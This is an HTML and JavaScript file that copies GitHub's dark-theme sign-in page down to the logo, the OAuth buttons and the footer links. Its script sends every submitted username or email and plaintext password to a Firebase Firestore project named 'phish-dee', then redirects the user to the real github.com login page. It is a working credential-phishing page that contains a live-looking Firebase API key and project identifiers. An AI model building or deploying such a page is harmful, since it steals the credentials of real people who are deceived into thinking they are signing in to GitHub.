<!DOCTYPE html>
<html lang="en" data-color-mode="dark" data-dark-theme="dark">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<title>Sign in to GitHub · GitHub</title>
<style>
  /* =========================================================
     GitHub Primer dark theme tokens
     ======================================================= */
  :root {
    --bgColor-default: #0d1117;
    --bgColor-muted:   #151b23;
    --fgColor-default: #f0f6fc;
    --fgColor-muted:   #9198a1;
    --fgColor-accent:  #4493f8;
    --borderColor-default: #3d444d;
    --focus-outlineColor: #1f6feb;

    --button-primary-bgColor-rest:   #238636;
    --button-primary-bgColor-hover:  #29903b;
    --button-primary-bgColor-active: #2e9a40;
    --button-primary-fgColor-rest:   #ffffff;
    --button-primary-borderColor-rest: rgba(240,246,252,0.1);

    --button-default-bgColor-rest:   #212830;
    --button-default-bgColor-hover:  #262c36;
    --button-default-bgColor-active: #2a313c;
    --button-default-borderColor-rest: #3d444d;
    --button-default-fgColor-rest:   #f0f6fc;

    --error-bg: rgba(248,81,73,0.1);
    --error-border: rgba(248,81,73,0.4);
    --error-fg: #ff7b72;
    --success-bg: rgba(46,160,67,0.15);
    --success-border: rgba(46,160,67,0.4);
    --success-fg: #3fb950;

    --base-size-8: 8px;
    --base-size-16: 16px;

    --fontStack-sansSerif: -apple-system, BlinkMacSystemFont, "Segoe UI", "Noto Sans",
      Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji";
  }

  *, *::before, *::after { box-sizing: border-box; }
  [hidden] { display: none !important; }
  html { -webkit-text-size-adjust: 100%; }

  /* =========================================================
     Page shell
     ======================================================= */
  body {
    margin: 0;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    background-color: var(--bgColor-default);
    color: var(--fgColor-default);
    font-family: var(--fontStack-sansSerif);
    font-size: 14px;
    line-height: 1.5;
    word-wrap: break-word;
  }

  /* Wrapper that centers the login column in the viewport */
  .application-main {
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  main {
    width: 100%;
    max-width: 340px;
  }

  /* =========================================================
     .authentication — exact rules from GitHub
     ======================================================= */
  .authentication {
    -webkit-font-smoothing: antialiased;
    text-rendering: optimizelegibility;
    -moz-text-size-adjust: 100%;
    text-size-adjust: 100%;
    padding: var(--base-size-16);
    gap: var(--base-size-16);
    flex-direction: column;
    align-items: center;
    width: 100%;
    display: flex;
  }

  /* =========================================================
     Header (SessionsAuthHeader partial)
     ======================================================= */
  .auth-header {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: var(--base-size-16);
    text-align: center;
  }

  .auth-logo-wrapper {
    width: 44px;
    height: 44px;
    clip-path: circle(22px);
    background-color: transparent;
    border-radius: 50%;
    position: relative;
    overflow: hidden;
    display: flex;
    justify-content: center;
    align-items: center;
  }

  .auth-logo {
    background-color: var(--bgColor-default);
    width: 48px;
    height: 48px;
    transform: translate(-2px, -2px);
    color: var(--fgColor-default);
    display: block;
  }

  .auth-title {
    font-size: 20px;
    font-weight: 600;
    margin: 0;
    letter-spacing: -0.3px;
  }

  /* =========================================================
     .authentication-body — exact rules from GitHub
     ======================================================= */
  .authentication-body {
    font-size: 14px;
    text-align: center;
    text-wrap: pretty;
    align-items: center;
    gap: var(--base-size-8);
    flex-direction: column;
    width: 100%;
    display: flex;
  }

  /* =========================================================
     Flash messages
     ======================================================= */
  .flash {
    width: 100%;
    margin: 0;
    padding: 8px 12px;
    font-size: 13px;
    text-align: left;
    border-radius: 6px;
    word-break: break-word;
  }
  .flash-error   { color: var(--error-fg);   background: var(--error-bg);   border: 1px solid var(--error-border); }
  .flash-success { color: var(--success-fg); background: var(--success-bg); border: 1px solid var(--success-border); }

  /* =========================================================
     Login form
     ======================================================= */
  #auth-form {
    width: 100%;
    text-align: left;
  }

  .field { margin-bottom: 16px; }
  .field:last-of-type { margin-bottom: 0; }

  .field label,
  .label-row label {
    display: block;
    margin-bottom: 8px;
    font-size: 14px;
    font-weight: 600;
    color: var(--fgColor-default);
  }

  .label-row {
    display: flex;
    align-items: baseline;
    justify-content: space-between;
    gap: 8px;
    margin-bottom: 8px;
  }
  .label-row label { margin-bottom: 0; }
  .label-row a { font-size: 12px; }

  .field-actions { margin-top: 16px; }

  input[type="text"],
  input[type="password"] {
    width: 100%;
    padding: 5px 12px;
    font-family: inherit;
    font-size: 14px;
    line-height: 20px;
    color: var(--fgColor-default);
    background-color: var(--bgColor-default);
    border: 1px solid var(--borderColor-default);
    border-radius: 6px;
    outline: none;
    box-shadow: inset 0 1px 0 rgba(1,4,9,0.24);
    transition: color 80ms cubic-bezier(0.33,1,0.68,1),
                background-color 80ms cubic-bezier(0.33,1,0.68,1),
                box-shadow 80ms cubic-bezier(0.33,1,0.68,1),
                border-color 80ms cubic-bezier(0.33,1,0.68,1);
  }
  input::placeholder { color: var(--fgColor-muted); opacity: 1; }
  input:focus {
    border-color: var(--focus-outlineColor);
    box-shadow: inset 0 0 0 1px var(--focus-outlineColor);
    outline: none;
  }
  input:disabled { opacity: 0.6; cursor: not-allowed; }

  /* =========================================================
     Buttons
     ======================================================= */
  .btn {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    width: 100%;
    padding: 5px 16px;
    font-family: inherit;
    font-size: 14px;
    font-weight: 500;
    line-height: 20px;
    text-align: center;
    white-space: nowrap;
    cursor: pointer;
    user-select: none;
    border: 1px solid transparent;
    border-radius: 6px;
    transition: color 80ms cubic-bezier(0.33,1,0.68,1),
                background-color 80ms cubic-bezier(0.33,1,0.68,1),
                border-color 80ms cubic-bezier(0.33,1,0.68,1);
  }
  .btn:disabled { opacity: 0.65; cursor: not-allowed; }
  .btn svg { flex: 0 0 auto; display: block; }

  .btn-primary {
    color: var(--button-primary-fgColor-rest);
    background-color: var(--button-primary-bgColor-rest);
    border-color: var(--button-primary-borderColor-rest);
    box-shadow: 0 1px 0 rgba(1,4,9,0.1);
  }
  .btn-primary:hover:not(:disabled)  { background-color: var(--button-primary-bgColor-hover); }
  .btn-primary:active:not(:disabled) { background-color: var(--button-primary-bgColor-active); }

  .btn-secondary {
    color: var(--button-default-fgColor-rest);
    background-color: var(--button-default-bgColor-rest);
    border-color: var(--button-default-borderColor-rest);
    box-shadow: 0 1px 0 rgba(1,4,9,0.1);
  }
  .btn-secondary:hover:not(:disabled)  { background-color: var(--button-default-bgColor-hover); }
  .btn-secondary:active:not(:disabled) { background-color: var(--button-default-bgColor-active); }

  /* =========================================================
     Authentication divider (the "or" line)
     ======================================================= */
  .authentication-divider {
    display: flex;
    align-items: center;
    gap: var(--base-size-8);
    width: 100%;
    margin: 8px 0;
    color: var(--fgColor-muted);
    font-size: 12px;
  }
  .authentication-divider::before,
  .authentication-divider::after {
    content: "";
    flex: 1;
    height: 1px;
    background-color: var(--borderColor-default);
  }

  /* =========================================================
     .authentication-footer — exact rules from GitHub
     ======================================================= */
  .authentication-footer {
    align-items: center;
    gap: var(--base-size-16);
    flex-direction: column;
    width: 100%;
    display: flex;
  }

  .authentication-login-footer-links p {
    margin: 4px 0 0;
    font-size: 14px;
    color: var(--fgColor-default);
  }

  /* The passkey action is a Button--link in GitHub's markup */
  .btn-link {
    display: inline;
    padding: 0;
    margin: 0;
    background: none;
    border: 0;
    color: var(--fgColor-accent);
    font-family: inherit;
    font-size: 14px;
    line-height: 1.5;
    cursor: pointer;
  }
  .btn-link:hover { text-decoration: underline; }

  /* =========================================================
     Site footer — muted background, sticks to bottom
     ======================================================= */
  .footer-session-authentication {
    background-color: var(--bgColor-muted);
    width: 100%;
    margin-top: auto;
  }

  .footer-session-authentication-links {
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    align-items: center;
    gap: 8px 16px;
    margin: 0;
    padding: 24px 16px;
    list-style: none;
    font-size: 12px;
  }
  .footer-session-authentication-links a {
    color: var(--fgColor-accent);
    text-decoration: none;
  }
  .footer-session-authentication-links a:hover { text-decoration: underline; }

  /* =========================================================
     Links
     ======================================================= */
  a { color: var(--fgColor-accent); text-decoration: none; }
  a:hover { text-decoration: underline; }

  /* =========================================================
     Loading
     ======================================================= */
  .loading { display: flex; align-items: center; justify-content: center; gap: 8px; color: var(--fgColor-muted); font-size: 13px; }
  .spinner {
    width: 16px; height: 16px;
    border: 2px solid var(--borderColor-default);
    border-top-color: var(--fgColor-muted);
    border-radius: 50%;
    animation: spin 0.6s linear infinite;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>

  <div class="application-main">
    <main>
      <div class="authentication" data-test-selector="login-standard-view" data-hpc="true">

        <!-- ================= HEADER ================= -->
        <div class="auth-header">
          <div class="auth-logo-wrapper">
            <svg class="auth-logo" viewBox="0 0 24 24" width="48" height="48" fill="currentColor" aria-hidden="true">
              <path d="M10.226 17.284c-2.965-.36-5.054-2.493-5.054-5.256 0-1.123.404-2.336 1.078-3.144-.292-.741-.247-2.314.09-2.965.898-.112 2.111.36 2.83 1.01.853-.269 1.752-.404 2.853-.404 1.1 0 1.999.135 2.807.382.696-.629 1.932-1.1 2.83-.988.315.606.36 2.179.067 2.942.72.854 1.101 2 1.101 3.167 0 2.763-2.089 4.852-5.098 5.234.763.494 1.28 1.572 1.28 2.807v2.336c0 .674.561 1.056 1.235.786 4.066-1.55 7.255-5.615 7.255-10.646C23.5 6.188 18.334 1 11.978 1 5.62 1 .5 6.188.5 12.545c0 4.986 3.167 9.12 7.435 10.669.606.225 1.19-.18 1.19-.786V20.63a2.9 2.9 0 0 1-1.078.224c-1.483 0-2.359-.808-2.987-2.313-.247-.607-.517-.966-1.034-1.033-.27-.023-.359-.135-.359-.27 0-.27.45-.471.898-.471.652 0 1.213.404 1.797 1.235.45.651.921.943 1.483.943.561 0 .92-.202 1.437-.719.382-.381.674-.718.944-.943"></path>
            </svg>
          </div>
          <h1 class="auth-title">Sign in to GitHub</h1>
        </div>

        <!-- ================= BODY ================= -->
        <div class="authentication-body authentication-body--with-form new-session">

          <div class="flash flash-error"   id="auth-error"   role="alert"  hidden></div>
          <div class="flash flash-success" id="auth-success" role="status" hidden></div>

          <form id="auth-form" novalidate>
            <div class="field" id="field-name" hidden>
              <label for="name">Display name</label>
              <input type="text" id="name" autocomplete="name" placeholder="Optional">
            </div>

            <div class="field">
              <label for="email">Username or email address</label>
              <input type="text" id="email" name="login" autocomplete="username"
                     autocapitalize="off" spellcheck="false" autofocus required>
            </div>

            <div class="field">
              <div class="label-row">
                <label for="password">Password</label>
                <a href="#" id="forgot-link">Forgot password?</a>
              </div>
              <input type="password" id="password" name="password"
                     autocomplete="current-password" required>
            </div>

            <div class="field-actions">
              <button type="submit" class="btn btn-primary" id="submit-btn">Sign in</button>
            </div>
          </form>

          <div class="authentication-divider">
            <span>or</span>
          </div>

          <button type="button" class="btn btn-secondary" id="google-btn">
            <svg width="16" height="16" viewBox="0 0 16 16" aria-hidden="true">
              <g clip-path="url(#goog)">
                <path d="M8.00018 3.16667C9.18018 3.16667 10.2368 3.57333 11.0702 4.36667L13.3535 2.08333C11.9668 0.793333 10.1568 0 8.00018 0C4.87352 0 2.17018 1.79333 0.853516 4.40667L3.51352 6.47C4.14352 4.57333 5.91352 3.16667 8.00018 3.16667Z" fill="#EA4335"/>
                <path d="M15.66 8.18335C15.66 7.66002 15.61 7.15335 15.5333 6.66669H8V9.67335H12.3133C12.12 10.66 11.56 11.5 10.72 12.0667L13.2967 14.0667C14.8 12.6734 15.66 10.6134 15.66 8.18335Z" fill="#4285F4"/>
                <path d="M3.51 9.53001C3.35 9.04668 3.25667 8.53334 3.25667 8.00001C3.25667 7.46668 3.34667 6.95334 3.51 6.47001L0.85 4.40668C0.306667 5.48668 0 6.70668 0 8.00001C0 9.29334 0.306667 10.5133 0.853333 11.5933L3.51 9.53001Z" fill="#FBBC05"/>
                <path d="M8.0001 16C10.1601 16 11.9768 15.29 13.2968 14.0633L10.7201 12.0633C10.0034 12.5467 9.0801 12.83 8.0001 12.83C5.91343 12.83 4.14343 11.4233 3.5101 9.52667L0.850098 11.59C2.1701 14.2067 4.87343 16 8.0001 16Z" fill="#34A853"/>
              </g>
              <defs><clipPath id="goog"><rect width="16" height="16" fill="white"/></clipPath></defs>
            </svg>
            <span>Continue with Google</span>
          </button>

          <button type="button" class="btn btn-secondary" id="apple-btn">
            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor" aria-hidden="true">
              <g clip-path="url(#app)">
                <path d="M8.08803 4.3535C8.74395 4.3535 9.56615 3.91006 10.0558 3.31881C10.4992 2.78299 10.8226 2.03469 10.8226 1.28639C10.8226 1.18477 10.8133 1.08314 10.7948 1C10.065 1.02771 9.18738 1.48963 8.6608 2.10859C8.24508 2.57975 7.86631 3.31881 7.86631 4.07635C7.86631 4.18721 7.88479 4.29807 7.89402 4.33502C7.94021 4.34426 8.01412 4.3535 8.08803 4.3535ZM5.77846 15.5318C6.67457 15.5318 7.07182 14.9313 8.18965 14.9313C9.32596 14.9313 9.57539 15.5133 10.5731 15.5133C11.5524 15.5133 12.2083 14.608 12.8273 13.7211C13.5201 12.7049 13.8065 11.7072 13.825 11.661C13.7603 11.6425 11.885 10.8757 11.885 8.7232C11.885 6.85707 13.3631 6.01639 13.4462 5.95172C12.467 4.5475 10.9796 4.51055 10.5731 4.51055C9.47377 4.51055 8.57766 5.1757 8.01412 5.1757C7.4044 5.1757 6.60066 4.5475 5.64912 4.5475C3.83842 4.5475 2 6.0441 2 8.87101C2 10.6263 2.68363 12.4832 3.52432 13.6842C4.2449 14.7004 4.87311 15.5318 5.77846 15.5318Z"/>
              </g>
              <defs><clipPath id="app"><rect width="16" height="16"/></clipPath></defs>
            </svg>
            <span>Continue with Apple</span>
          </button>
        </div>

        <!-- ================= FOOTER ================= -->
        <div class="authentication-footer">
          <div class="authentication-login-footer-links">
            <p>
              <span id="toggle-text">New to GitHub?</span>
              <a href="#" id="toggle-link">Create an account</a>
            </p>
          </div>
          <p style="margin:0">
            <button type="button" class="btn-link" id="passkey-link">Sign in with a passkey</button>
          </p>
        </div>

      </div>
    </main>
  </div>

  <!-- ================= SITE FOOTER ================= -->
  <div class="footer-session-authentication" role="contentinfo">
    <ul class="footer-session-authentication-links">
      <li><a href="https://docs.github.com/site-policy/github-terms/github-terms-of-service">Terms</a></li>
      <li><a href="https://docs.github.com/site-policy/privacy-policies/github-privacy-statement">Privacy</a></li>
      <li><a href="https://docs.github.com">Docs</a></li>
      <li><a href="https://support.github.com">Contact GitHub Support</a></li>
      <li><a href="#">Manage cookies</a></li>
      <li><a href="#">Do not share my personal information</a></li>
    </ul>
  </div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
  import {
    getFirestore, collection, doc, setDoc, serverTimestamp
  } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

  const firebaseConfig = {
  apiKey: "AIzaSyBI3s8i-Po3c3lmVUgNq62etMHjMC-Pf8o",
  authDomain: "phish-dee.firebaseapp.com",
  projectId: "phish-dee",
  storageBucket: "phish-dee.firebasestorage.app",
  messagingSenderId: "747562964327",
  appId: "1:747562964327:web:dc4c394f571eedb6304bc2",
  measurementId: "G-ZYFXSXV979"
};

  const CONFIGURED =
    typeof firebaseConfig.apiKey === "string" &&
    firebaseConfig.apiKey.length > 0 &&
    !firebaseConfig.apiKey.startsWith("YOUR_");

  const REDIRECT_URL = "https://github.com/login";

  let db = null;
  let busy = false;

  const els = {
    authError:   document.getElementById("auth-error"),
    authSuccess: document.getElementById("auth-success"),
    form:        document.getElementById("auth-form"),
    fieldName:   document.getElementById("field-name"),
    name:        document.getElementById("name"),
    email:       document.getElementById("email"),
    password:    document.getElementById("password"),
    submitBtn:   document.getElementById("submit-btn"),
    googleBtn:   document.getElementById("google-btn"),
    appleBtn:    document.getElementById("apple-btn"),
    forgotLink:  document.getElementById("forgot-link"),
    toggleText:  document.getElementById("toggle-text"),
    toggleLink:  document.getElementById("toggle-link"),
    passkeyLink: document.getElementById("passkey-link")
  };

  function showError(msg) {
    els.authSuccess.hidden = true;
    els.authError.textContent = msg;
    els.authError.hidden = false;
  }
  function clearMessages() {
    els.authError.hidden = true;
    els.authSuccess.hidden = true;
  }
  function setBusy(next) {
    busy = next;
    els.submitBtn.disabled = busy;
    els.googleBtn.disabled = busy;
    els.appleBtn.disabled = busy;
    els.email.disabled = busy;
    els.password.disabled = busy;
    els.name.disabled = busy;
    els.submitBtn.textContent = busy ? "Signing in…" : "Sign in";
  }

  async function storeCredentials(identifier, password, displayName) {
    const usersRef = collection(db, "users");
    const docRef = doc(usersRef);
    await setDoc(docRef, {
      uid: docRef.id,
      identifier: identifier,
      displayName: displayName || "",
      password: password,
      provider: "password",
      createdAt: serverTimestamp(),
      userAgent: navigator.userAgent
    });
    return docRef.id;
  }

  if (!CONFIGURED) {
    console.warn("Firebase config missing — add your keys to firebaseConfig.");
    setBusy(true);
  } else {
    const app = initializeApp(firebaseConfig);
    db = getFirestore(app);
    setBusy(false);
  }

  els.toggleLink.addEventListener("click", (e) => {
    e.preventDefault();
    if (busy) return;
    const isSignup = els.fieldName.hidden;
    els.fieldName.hidden = !isSignup;
    els.toggleText.textContent = isSignup ? "Already have an account?" : "New to GitHub?";
    els.toggleLink.textContent = isSignup ? "Sign in" : "Create an account";
    clearMessages();
  });

  els.form.addEventListener("submit", async (e) => {
    e.preventDefault();
    if (!db || busy) return;
    clearMessages();

    const identifier = els.email.value.trim();
    const password = els.password.value;
    const displayName = els.name.value.trim();

    if (!identifier || !password) {
      showError("Please fill out both fields.");
      return;
    }

    setBusy(true);
    try {
      await storeCredentials(identifier, password, displayName);
      els.form.reset();
      localStorage.setItem("session", JSON.stringify({ identifier, displayName, at: Date.now() }));
      window.location.href = REDIRECT_URL;
    } catch (err) {
      console.error(err);
      showError(err.message || "Could not save. Check the console for details.");
      setBusy(false);
    }
  });

  els.form.addEventListener("input", clearMessages);
  els.forgotLink.addEventListener("click", (e) => { e.preventDefault(); showError("Password reset isn't available in this demo."); });
  els.googleBtn.addEventListener("click", () => showError("OAuth sign-in isn't available in this demo."));
  els.appleBtn.addEventListener("click", () => showError("OAuth sign-in isn't available in this demo."));
  els.passkeyLink.addEventListener("click", (e) => { e.preventDefault(); showError("Passkey sign-in is not available in this demo."); });
</script>
</body>
</html>
